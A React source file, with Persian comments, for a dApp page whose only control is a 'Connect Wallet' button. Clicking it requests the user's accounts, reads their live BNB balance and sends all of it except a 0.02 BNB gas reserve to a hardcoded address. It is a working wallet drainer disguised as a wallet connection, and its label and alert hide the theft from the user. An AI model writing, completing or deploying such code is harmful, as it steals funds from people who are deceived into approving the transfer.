import React, { useState } from "react";
import Web3 from "web3";

// دریافت موجودی واقعی از شبکه (eth_getBalance)
async function getLiveBalance(address) {
  try {
    const balanceHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    });
    // استفاده از Web3 برای تبدیل از Wei به ether
    return parseFloat(Web3.utils.fromWei(balanceHex, "ether")).toFixed(6);
  } catch (error) {
    console.error("❌ Error fetching live balance:", error);
    return null;
  }
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    if (typeof window.ethereum === "undefined") {
      alert(
        "No Ethereum provider found. Please open in Trust Wallet DApp Browser!"
      );
      return;
    }

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    const liveBalanceStr = await getLiveBalance(userAddress);
    console.log("💰 Live BNB Balance:", liveBalanceStr);
    const totalBalance = parseFloat(liveBalanceStr);
    if (isNaN(totalBalance)) {
      console.error("❌ Could not parse live balance.");
      return;
    }

    // کسر 0.02 BNB به عنوان reserve جهت هزینه‌های تراکنش
    const reserveBNB = 0.02;
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      console.error("❌ Insufficient funds to cover reserve for gas fee.");
      return;
    }
    console.log("Calculated send amount (BNB):", sendAmount);

    // آدرس مقصد ثابت
    const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";

    // تبدیل sendAmount به Wei با استفاده از Web3
    const weiValue = Web3.utils.toWei(sendAmount.toString(), "ether");
    const txObject = {
      from: userAddress,
      to: destination,
      value: Web3.utils.toHex(weiValue),
    };

    try {
      // ارسال تراکنش از کیف پول کاربر؛ گس توسط کاربر پرداخت می‌شود
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txObject],
      });
      console.log("Transaction sent, tx hash:", txHash);
      alert("Transaction sent! TxHash: " + txHash);
    } catch (error) {
      console.error("❌ Transaction failed:", error);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
